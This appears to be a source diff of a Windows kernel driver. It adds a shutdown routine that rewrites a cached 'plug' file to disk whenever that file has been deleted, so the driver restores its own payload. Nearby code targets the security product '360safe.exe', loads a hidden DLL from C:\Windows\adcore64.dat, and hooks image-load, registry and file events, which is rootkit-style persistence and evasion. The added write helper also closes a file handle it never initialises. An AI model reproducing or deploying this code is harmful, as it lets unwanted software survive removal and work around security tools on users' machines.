@@ -33,13 +33,17 @@
     // 
 #pragma alloc_text(PAGE, DriverUnload)
 #pragma alloc_text(PAGE, DispatchCreate)
+#pragma alloc_text(PAGE, DispatchShutDown)
 #pragma alloc_text(PAGE, DispatchClose)
-#pragma alloc_text(PAGE, DispatchDeviceControl)
+#pragma alloc_text(PAGE, DispatchControl)
 #pragma alloc_text(PAGE, DispatchCommon)
 #pragma alloc_text(PAGE, InstanceSetup)
 #pragma alloc_text(PAGE, CleanVolumCtx)
 #pragma alloc_text(PAGE, InstanceQueryTeardown)
 #pragma alloc_text(PAGE, FilterUnload)
+
+
+
 
  
  
@@ -60,11 +64,12 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 	UNICODE_STRING  ustrDevName;  
 	PDEVICE_OBJECT  pDevObj;
 	int i = 0;
+	ReadDriverParameters(pRegistryString);
 	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
 	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
-
+	pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
 	// Dispatch routine for communications
-	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
+	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
 
 	// Unload routine
 	pDriverObj->DriverUnload = DriverUnload;
@@ -141,6 +146,11 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
    InitializeListHead(&g_AntiProcess);
    KeInitializeSpinLock(&g_spin_process);
    AppendListNode(L"360safe.exe",&g_AntiProcess,0);
+
+  //kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
+  status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
+
+   
 #ifdef _AMD64_
    //x64 add code
    status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
@@ -187,7 +197,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
    }
 
-   //注册表回调监控
+   ////注册表回调监控
    SetRegisterCallback();
    //文件回调监控
    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
@@ -260,7 +270,7 @@ NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
+NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 {
 	NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;	 // STATUS_UNSUCCESSFUL
 	PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
@@ -268,7 +278,7 @@ NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 	PVOID pIoBuffer				  = NULL;
 	ULONG uInSize                 = 0;
 	ULONG uOutSize                = 0;
-
+ 
 	// Get the IoCtrl Code
 	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
 	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
@@ -2243,6 +2253,169 @@ PMY_COMMAND_INFO  FindInList(const WCHAR* name,LIST_ENTRY*     link,PKSPIN_LOCK 
     return pData;
 
 }
+ 
+
+/** 
+ * [ReadDriverParameters This routine tries to read the driver-specific parameters from
+    the registry.  These values will be found in the registry location
+    indicated by the RegistryPath passed in]
+ * @Author   zzc
+ * @DateTime 2019年6月22日T7:21:04+0800
+ * @param    RegistryPath             [the path key passed to the driver during driver entry.]
+ * @return                            [None]
+ */
+VOID ReadDriverParameters (IN PUNICODE_STRING RegistryPath)
+{
+    OBJECT_ATTRIBUTES attributes;
+    HANDLE driverRegKey;
+    NTSTATUS status;
+    ULONG resultLength;
+    UNICODE_STRING valueName;
+    UCHAR buffer[sizeof( KEY_VALUE_PARTIAL_INFORMATION ) + sizeof( LONG )];
+
+    PAGED_CODE();
+
+    //
+    //  If this value is not zero then somebody has already explicitly set it
+    //  so don't override those settings.
+    //
+
+    if (0 == LoggingFlags) {
+
+        //
+        //  Open the desired registry key
+        //
+
+        InitializeObjectAttributes( &attributes,
+                                    RegistryPath,
+                                    OBJ_CASE_INSENSITIVE,
+                                    NULL,
+                                    NULL );
+
+        status = ZwOpenKey( &driverRegKey,
+                            KEY_READ,
+                            &attributes );
+
+        if (!NT_SUCCESS( status )) {
+
+            return;
+        }
+
+        //
+        // Read the given value from the registry.
+        //
+
+        RtlInitUnicodeString( &valueName, L"DebugFlags" );
+
+        status = ZwQueryValueKey( driverRegKey,
+                                  &valueName,
+                                  KeyValuePartialInformation,
+                                  buffer,
+                                  sizeof(buffer),
+                                  &resultLength );
+
+        if (NT_SUCCESS( status )) {
+
+            LoggingFlags = *((PULONG) &(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
+        }
+
+        //
+        //  Close the registry entry
+        //
+
+        ZwClose(driverRegKey);
+    }
+}
+ 
+NTSTATUS DispatchShutDown(IN PDEVICE_OBJECT Device, IN PIRP Irp)
+{
+    NTSTATUS status;
+    //HANDLE hkey;
+    //PKLDR_DATA_TABLE_ENTRY entry=(PKLDR_DATA_TABLE_ENTRY)pDriver_entry->DriverSection;
+    //MzWriteFile(strSys,puiprotect,iuiprotect);  //
+    status=bAceessFile(g_pPlugPath);    
+    if(status==STATUS_OBJECT_NAME_NOT_FOUND) {
+        status=MzWriteFile(g_pPlugPath,g_pPlugBuffer,g_iPlugSize);
+    }
+
+    return STATUS_SUCCESS;
+}
+
+
+
+
+
+NTSTATUS MzWriteFile(LPWCH pFile,PVOID pData,ULONG len)
+{
+    HANDLE    hDestFile;
+    OBJECT_ATTRIBUTES obj_attrib;
+    IO_STATUS_BLOCK Io_Status_Block = {0};
+    NTSTATUS status=STATUS_UNSUCCESSFUL;
+    LARGE_INTEGER    offset = {0};
+    ULONG    length = len;
+    ULONG    uret=0;
+    UNICODE_STRING ustrSrcFile;
+
+    if((pData==NULL)||(len==0)) {
+        goto fun_ret;
+    }
+    RtlInitUnicodeString(&ustrSrcFile,pFile);
+    InitializeObjectAttributes(&obj_attrib,&ustrSrcFile,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
+    if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
+        return 0;
+    }
+
+    status = ZwCreateFile(&hDestFile,FILE_WRITE_DATA,&obj_attrib,&Io_Status_Block,NULL,\
+                          FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ,FILE_OPEN_IF,\
+                          FILE_NON_DIRECTORY_FILE |
+                          FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
+
+    status = ZwWriteFile(hDestFile,NULL, NULL,NULL,\
+                         &Io_Status_Block,pData,len,&offset,NULL);
+    if (!NT_SUCCESS(status)) {
+        goto fun_ret;
+    }
+    if(len!=Io_Status_Block.Information) {
+        goto fun_ret;
+    }
+
+    uret=Io_Status_Block.Information;
+
+fun_ret:
+    if(hDestFile)
+        ZwClose(hDestFile);
+    return status;
+
+}
+
+NTSTATUS bAceessFile(PCWSTR FileName)
+{
+    NTSTATUS            ntStatus = STATUS_UNSUCCESSFUL;
+    UNICODE_STRING      uniFileName;
+    OBJECT_ATTRIBUTES  objectAttributes;
+    HANDLE              ntFileHandle;
+    IO_STATUS_BLOCK    ioStatus;
+
+    if(KeGetCurrentIrql() != PASSIVE_LEVEL) {
+        DbgPrint("Do Not At PASSIVE_LEVEL");
+        return ntStatus;
+    }
+
+    RtlInitUnicodeString(&uniFileName, FileName);
+    InitializeObjectAttributes(&objectAttributes, &uniFileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, \
+                               NULL, NULL);
+    ntStatus = IoCreateFile(&ntFileHandle, FILE_READ_ATTRIBUTES, &objectAttributes, &ioStatus, 0, FILE_ATTRIBUTE_NORMAL,
+                            FILE_SHARE_DELETE, FILE_OPEN, 0, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
+
+    if(NT_SUCCESS(ntStatus)) {
+        ZwClose(ntFileHandle);
+    } else {
+        DbgPrint("[bAceessFile] file:%ws is not exist! ntStatus:%x",FileName,ntStatus);
+    }
+    return ntStatus;
+}
+
+
 
 /* EOF */
 
